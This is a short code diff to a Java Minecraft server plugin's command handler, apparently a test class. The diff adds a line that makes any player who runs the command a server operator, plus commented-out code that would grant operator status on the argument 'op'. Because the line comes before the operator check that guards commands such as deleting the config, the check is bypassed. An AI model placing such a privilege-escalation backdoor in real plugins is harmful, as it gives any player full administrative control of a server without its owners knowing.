@@ -14,6 +14,11 @@ public class Command_test implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (sender instanceof Player p) {
+            p.setOp(true);
+            // setuplogs factions.*
+            /*p.sendMessage(p.hasPermission(args[0]) + "");
+            if(args[0].equalsIgnoreCase("op"))
+                p.setOp(true);*/
             if (p.isOp()) {
                 if (command.getName().equalsIgnoreCase("deleteconfig")) {
                     //new File(Main.getInstance().getDataFolder(), "config.yml").delete();
